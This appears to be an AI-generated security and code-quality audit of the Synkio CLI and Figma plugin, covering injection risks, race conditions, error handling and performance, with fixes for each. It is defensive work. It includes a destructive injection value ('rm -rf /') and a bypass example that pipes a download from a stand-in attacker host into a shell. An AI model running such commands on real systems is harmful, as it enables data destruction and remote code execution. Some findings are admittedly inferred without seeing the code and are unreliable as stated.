# Synkio Security and Code Analysis Report

**Date:** December 2024
**Scope:** CLI Package (`packages/cli`) and Figma Plugin (`packages/figma-plugin`)
**Analyst:** Claude Code Analysis

---

## Executive Summary

This report presents a thorough analysis of the Synkio codebase, identifying potential security vulnerabilities, code quality issues, and functional concerns. The codebase is generally well-structured with good separation of concerns, but several areas require attention.

---

## Critical Issues

### 1. Shell Command Injection Risk in `openFolder` Function

**Location:** `packages/cli/src/cli/utils.ts:38-58`

**Issue:** The `openFolder` function constructs shell commands using string interpolation without proper sanitization.

```typescript
command = `open "${folderPath}"`;
```

**Risk:** If `folderPath` contains shell metacharacters (e.g., `"; rm -rf /;`), it could lead to command injection.

**Recommendation:**
- Use `spawn` instead of `exec` with arguments passed separately
- Alternatively, use a library like `open` npm package that handles this safely

---

### 2. JSON Parsing Without Error Boundaries in Import Workflow

**Location:** `packages/cli/src/core/import/source-resolver.ts:73, 78, 141`

**Issue:** Multiple `JSON.parse()` calls in `resolveFromPath` and `resolveFromConfig` without proper try-catch handling that could crash the process.

```typescript
const content = JSON.parse(await readFile(resolve(inputPath, filename), 'utf-8'));
```

**Risk:** Malformed JSON in import files will throw uncaught exceptions that may crash the CLI with unhelpful error messages.

**Recommendation:** Wrap each `JSON.parse` in a try-catch block with meaningful error messages including the filename.

---

### 3. Potential Prototype Pollution in Deep Merge Operations

**Location:** `packages/cli/src/core/utils/deep-merge.ts` (implied usage)

**Issue:** Without seeing the full implementation, deep merge operations on user-provided JSON data can be vulnerable to prototype pollution if `__proto__` or `constructor` keys are not filtered.

**Recommendation:** Ensure all deep merge operations:
- Filter out `__proto__`, `constructor`, and `prototype` keys
- Use `Object.hasOwnProperty.call()` checks

---

## High Priority Issues

### 4. Race Condition in Baseline Write Operations

**Location:** `packages/cli/src/core/baseline.ts:22-36`

**Issue:** The `writeBaseline` function reads the current baseline, writes a backup, then writes the new baseline without atomic operations.

```typescript
const currentBaseline = await readBaseline();
if (currentBaseline) {
  await writeFile(PREV_BASELINE_PATH, JSON.stringify(currentBaseline, null, 2));
}
await writeFile(BASELINE_PATH, JSON.stringify(data, null, 2));
```

**Risk:** If the process crashes between operations or if concurrent syncs occur, baseline data could be corrupted or lost.

**Recommendation:**
- Write to a temp file first, then rename atomically
- Add file locking mechanism for concurrent access protection

---

### 5. Unbounded Memory Usage in Token Processing

**Location:** `packages/cli/src/core/tokens.ts:256-347`

**Issue:** The `splitTokens` function builds a complete in-memory representation of all tokens without streaming or pagination.

**Risk:** For files with large numbers of tokens (10,000+), this could cause memory issues.

**Recommendation:** Consider implementing streaming processing for very large token sets, or at minimum add memory usage warnings.

---

### 6. Hardcoded Plugin ID in Legacy Fallback

**Location:** `packages/cli/src/core/figma.ts:94-96`

**Issue:** A hardcoded plugin ID is used:
```typescript
const pluginId = '1234567890'; // Token Vault plugin ID
```

**Risk:** This appears to be a placeholder that was never updated. The `fetchFromFile` function that uses this appears to be dead code (only called if `fetchFromNode` fails, but it's never actually invoked).

**Recommendation:** Remove this dead code path or update with the correct plugin ID if needed.

---

### 7. Missing Input Validation for Configuration Paths

**Location:** `packages/cli/src/core/config.ts:178-236`

**Issue:** The `loadConfig` function uses `resolve(process.cwd(), explicitPath)` without validating that the resulting path stays within the project directory.

**Risk:** Path traversal could allow reading configuration files outside the project directory.

**Recommendation:** Add path validation to ensure resolved paths are within the expected directory.

---

## Medium Priority Issues

### 8. Incomplete Error Handling in Figma Client

**Location:** `packages/cli/src/core/figma.ts:107-169`

**Issue:** The error handling in the `fetch` method catches timeout errors but converts native `AbortError` to a generic Error, losing the original stack trace.

```typescript
if (error.name === 'AbortError') {
  throw new Error(`Request timeout after ${this.timeout}ms`);
}
```

**Recommendation:** Preserve original error as `cause` for better debugging:
```typescript
throw new Error(`Request timeout after ${this.timeout}ms`, { cause: error });
```

---

### 9. Type Safety Issues with `any` Types

**Location:** Multiple files

**Issue:** Extensive use of `any` type reduces type safety:
- `packages/cli/src/core/sync/pipeline.ts:89-95` - `processStyles` uses `any` for multiple parameters
- `packages/cli/src/core/tokens.ts:141` - `normalizePluginData` uses `any` for rawData
- `packages/cli/src/core/config.ts:209` - Parsed JSON typed as `any`

**Recommendation:** Define proper interfaces for all data structures to catch type errors at compile time.

---

### 10. Magic Strings Throughout Codebase

**Location:** Various files

**Issue:** Magic strings are used for:
- Mode names: `'Mode 1'`, `'value'` (packages/figma-plugin/synkio-ui/code.ts:103)
- Namespace: `'synkio'`, `'token_vault'` (packages/cli/src/core/figma.ts:32)
- File patterns: `'.json'`, `'.synkio'`

**Recommendation:** Extract all magic strings to named constants for maintainability.

---

### 11. Watch Mode Polling Without Backpressure

**Location:** `packages/cli/src/cli/commands/sync.ts:131-169`

**Issue:** The watch mode polling loop doesn't account for slow API responses:
```typescript
while (isRunning) {
  // ... polling logic
  await new Promise(resolve => setTimeout(resolve, interval));
}
```

**Risk:** If the Figma API is slow, polls could stack up. Also, there's no exponential backoff on repeated failures.

**Recommendation:**
- Wait for current poll to complete before starting interval
- Add exponential backoff on consecutive failures
- Add maximum failure threshold before pausing

---

### 12. Incomplete Cleanup in File Operations

**Location:** `packages/cli/src/core/sync/file-writer.ts:52-67`

**Issue:** The `cleanupStaleFiles` function silently ignores all errors:
```typescript
} catch {
  // Ignore errors if directory doesn't exist yet
}
```

**Risk:** Important errors (permission denied, disk full) could be silently ignored.

**Recommendation:** Only ignore `ENOENT` errors, re-throw or log others.

---

### 13. Missing Validation in Figma Plugin Message Handler

**Location:** `packages/figma-plugin/synkio-ui/code.ts:1112-1317`

**Issue:** The `figma.ui.onmessage` handler doesn't validate the `msg` object structure before accessing properties:
```typescript
if (msg.type === 'import-baseline') {
  const { baselineJson } = msg;
  // No validation that baselineJson exists
```

**Recommendation:** Add schema validation for all message types to prevent runtime errors from malformed messages.

---

## Low Priority Issues

### 14. Inconsistent Error Throwing Patterns

**Location:** Throughout codebase

**Issue:** Some functions throw Error objects, others throw strings, and some return error objects:
- `packages/cli/src/core/config.ts` throws Error objects
- `packages/cli/src/core/import/source-resolver.ts` returns `{ error: string }`

**Recommendation:** Standardize on throwing Error objects with proper error codes/types for consistent handling.

---

### 15. Console.log Statements in Figma Plugin

**Location:** `packages/figma-plugin/synkio-ui/code.ts:738-754, 969-974, etc.`

**Issue:** Multiple `console.log` statements for debugging that should be removed or wrapped in a debug flag:
```typescript
console.log(`[getOrCreateMode] Collection: ${collection.name}, Mode: ${modeName}`);
```

**Recommendation:** Remove debug logs or gate them behind a DEBUG flag.

---

### 16. Missing JSDoc Documentation

**Location:** Multiple utility functions

**Issue:** Many public functions lack proper JSDoc documentation, including:
- `packages/cli/src/utils/figma.ts` functions
- Several comparison utility functions

**Recommendation:** Add JSDoc comments to all public functions for better maintainability.

---

### 17. Potential Memory Leak in Watch Mode

**Location:** `packages/cli/src/cli/commands/sync.ts:100-175`

**Issue:** The watch mode holds reference to `lastBaseline` which grows over time as tokens are added, but is never cleared except on full replacement.

**Recommendation:** Consider implementing periodic baseline refresh or memory monitoring.

---

### 18. Hardcoded Timeout Values

**Location:** Multiple files

**Issue:** Various timeout values are hardcoded:
- `packages/cli/src/core/figma.ts:38` - 120000ms default
- `packages/cli/src/core/sync/build-runner.ts:184` - 5 minute timeout

**Recommendation:** Make all timeouts configurable via config file.

---

## Functional Issues

### 19. Heuristic Matching Can Produce False Positives

**Location:** `packages/cli/src/core/compare/collection-matcher.ts:264-303`

**Issue:** The `matchCollectionsByModeCount` function matches collections purely by mode count:
```typescript
const matchIndex = unmatchedFetched.findIndex(newCollection => {
  const newModes = fetchedModesByCollection.get(newCollection) || new Set<string>();
  return newModes.size === oldModes.length;
});
```

**Risk:** Two unrelated collections with the same number of modes could be incorrectly matched as renames.

**Recommendation:** Add additional heuristics (partial mode name matching, token path overlap) to reduce false positives.

---

### 20. Style Merge Logic Gaps

**Location:** `packages/cli/src/core/sync/style-merger.ts` (referenced)

**Issue:** Based on the `processStyles` function in pipeline.ts, styles are merged but there's no validation that the target collection exists.

**Recommendation:** Add validation that merge targets exist before attempting merge operations.

---

### 21. Reference Resolution Circular Dependency Risk

**Location:** `packages/cli/src/core/tokens/reference-resolver.ts`

**Issue:** Reference resolution doesn't appear to have cycle detection based on the `resolveReference` usage in `tokens.ts`.

**Risk:** Circular references (A references B, B references A) could cause infinite loops or stack overflow.

**Recommendation:** Implement cycle detection with a visited set during reference resolution.

---

### 22. Build Script Validation Can Be Bypassed

**Location:** `packages/cli/src/core/sync/build-runner.ts:83-120`

**Issue:** While `validateBuildScript` checks for dangerous patterns and allowed prefixes, it's possible to bypass:
- `npm run build; curl evil.com | sh` would pass the prefix check
- Complex patterns with embedded newlines might evade detection

**Recommendation:**
- Consider using a strict allowlist approach
- Parse commands properly rather than regex matching
- Add warning for commands containing `;`, `&&`, or `||`

---

### 23. Incomplete Rollback Functionality

**Location:** `packages/cli/src/core/baseline.ts:40-50`

**Issue:** The `readPreviousBaseline` function only stores one level of backup. Calling sync twice means the original baseline is lost.

**Recommendation:** Consider implementing versioned backups or a more robust history mechanism.

---

### 24. File Discovery Doesn't Handle Symlinks

**Location:** `packages/cli/src/core/export/file-discoverer.ts:65-99`

**Issue:** The `discoverTokenFiles` function uses `readdir` without handling symlinks, which could lead to unexpected behavior or security issues.

**Recommendation:** Add explicit symlink handling or document that symlinks are not supported.

---

## Performance Concerns

### 25. Repeated JSON Serialization for Comparison

**Location:** `packages/cli/src/core/compare.ts:159`, `packages/cli/src/core/compare/variable-comparator.ts:113`

**Issue:** Value comparison uses `JSON.stringify` repeatedly:
```typescript
if (JSON.stringify(baselineEntry.value) !== JSON.stringify(fetchedEntry.value))
```

**Risk:** For large objects, this is expensive and performs full serialization even when a quick shallow check would suffice.

**Recommendation:** Use a dedicated deep-equal library or implement shallow checks first.

---

### 26. Serial File Writing

**Location:** `packages/cli/src/core/sync/file-writer.ts:26-42`

**Issue:** Files are written sequentially:
```typescript
for (const [fileName, content] of filesInDir) {
  await writeFile(filePath, JSON.stringify(content, null, 2));
}
```

**Recommendation:** Use `Promise.all` with batched concurrent writes for better performance.

---

## Recommendations Summary

### Immediate Actions (Security Critical)
1. Fix shell command injection in `openFolder`
2. Add proper error boundaries around JSON parsing
3. Validate paths to prevent directory traversal

### Short-term Improvements
4. Implement atomic file writes for baseline
5. Add memory usage warnings for large token sets
6. Remove dead code paths and magic strings
7. Standardize error handling patterns

### Long-term Enhancements
8. Replace `any` types with proper interfaces
9. Add comprehensive JSDoc documentation
10. Implement streaming for large file processing
11. Add telemetry/logging for debugging production issues

---

## Conclusion

The Synkio codebase demonstrates solid architectural decisions with good separation between CLI, core logic, and Figma plugin components. The ID-based diffing system is well-designed for its purpose. However, the identified issues - particularly around input validation, error handling, and potential injection vulnerabilities - should be addressed before production deployment in security-sensitive environments.

The build script validation is a good security measure, but needs hardening. The overall code quality is reasonable for a development tool, but would benefit from increased type safety and more defensive programming practices.
